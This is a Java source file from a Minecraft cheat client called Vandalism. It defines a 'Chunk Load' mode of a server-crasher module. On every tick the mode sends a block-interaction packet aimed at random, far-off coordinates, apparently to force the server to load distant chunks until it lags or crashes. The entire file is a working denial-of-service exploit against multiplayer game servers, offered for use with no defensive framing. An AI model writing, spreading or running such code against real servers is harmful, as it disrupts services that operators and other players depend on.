package de.nekosarekawaii.vandalism.feature.module.impl.exploit.modes.servercrasher;

import de.nekosarekawaii.vandalism.Vandalism;
import de.nekosarekawaii.vandalism.base.event.game.TickGameListener;
import de.nekosarekawaii.vandalism.feature.module.impl.exploit.ServerCrasherModule;
import de.nekosarekawaii.vandalism.feature.module.template.ModuleMulti;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.util.concurrent.ThreadLocalRandom;

public class ChunkLoadModuleMode extends ModuleMulti<ServerCrasherModule> implements TickGameListener {

    public ChunkLoadModuleMode(final ServerCrasherModule parent) {
        super("Chunk Load", parent);
    }

    @Override
    public void onActivate() {
        Vandalism.getInstance().getEventSystem().subscribe(TickGameEvent.ID, this);
    }

    @Override
    public void onDeactivate() {
        Vandalism.getInstance().getEventSystem().unsubscribe(TickGameEvent.ID, this);
    }

    @Override
    public void onTick() {
        if (this.mc.player == null || this.mc.interactionManager == null) return;
        final BlockPos playerPos = this.mc.player.getBlockPos();
        final int
                x = playerPos.getX() * ThreadLocalRandom.current().nextInt(1000, 10000),
                y = playerPos.getY(),
                z = playerPos.getX() * ThreadLocalRandom.current().nextInt(1000, 10000);
        this.mc.interactionManager.sendSequencedPacket(this.mc.world, sequence -> new PlayerInteractBlockC2SPacket(
                Hand.MAIN_HAND,
                new BlockHitResult(
                        new Vec3d(x, y, z),
                        Direction.DOWN,
                        new BlockPos(x, y, z),
                        false
                ),
                sequence
        ));
    }

}